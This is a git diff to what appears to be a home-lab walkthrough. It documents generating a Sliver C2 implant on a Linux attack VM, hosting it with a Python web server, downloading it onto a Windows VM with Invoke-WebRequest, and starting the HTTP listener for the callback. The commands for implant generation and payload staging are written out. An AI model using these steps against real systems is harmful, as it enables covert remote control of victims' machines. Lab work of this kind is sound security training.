@@ -209,11 +209,28 @@ i. We will begin a SSH session from into our Attack machine as we did earlier us
 <br>cd /opt/sliver
 <br> sliver-server 
 
-<br>![Screenshot (88)](https://github.com/user-attachments/assets/904740c0-4ca3-4a18-974b-d785a6f9628c)
-
-<br>ii. We now will generate a  C2 session payload using are attacks machine static ip address we assigned the VM. Using command below. After the command is compiled it will provide us with a implant of the payload which we will need to confirm. the names for our executables are unique and everyones is different. 
+<br>ii. We now will generate a  C2 session payload using are attacks machine static ip address we assigned the VM. Using command below. After the command is compiled it will provide us with a implant of the payload which we will need to confirm. the names for our executables are unique and everyones is different( note this for later). 
 
 <br> generate --http [Linux_VM_IP] --save /opt/sliver
 
-<br>
-<br>
+<br>![Screenshot (89)](https://github.com/user-attachments/assets/c03be165-58a9-4924-80b2-18f48c76cd8c)
+
+<br> We now will confirm the implants by using the command "implants". Then "exit" after the implant is confirmed. 
+
+<br>![Screenshot (90)](https://github.com/user-attachments/assets/7591b643-24a5-4066-88ab-3926f69e28e3)
+
+<br>iii. We will now download the C2 payload from our attack machine to the Windows VM using python to spin up a temporary web server. Our commands in our SSH will be as such...
+<br> cd /opt/sliver
+<br> python3 -m http.server 80
+
+<br> We will then stage our C2 payload using our Attack Machine  IP and the name of the unique payload we created. After staging we will snapshot the VM.
+
+<br> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+
+<br>![Screenshot (91)](https://github.com/user-attachments/assets/5bb31884-44aa-42c7-9c27-a6015d5cba9e)
+
+<h2>We will start and command the control session</h2>
+i. Now the payload is on the Windows VM we will switch to our attack machine via the SSH session and enable Sliver HTTP server to call the callback. We first will terminate the python webserver we started ( ctrl + c) then relaunch sliver "sliver-server" is the command.
+<br> ii. We will then start Sliver http listener with the command
+
+<br><i>http</i>
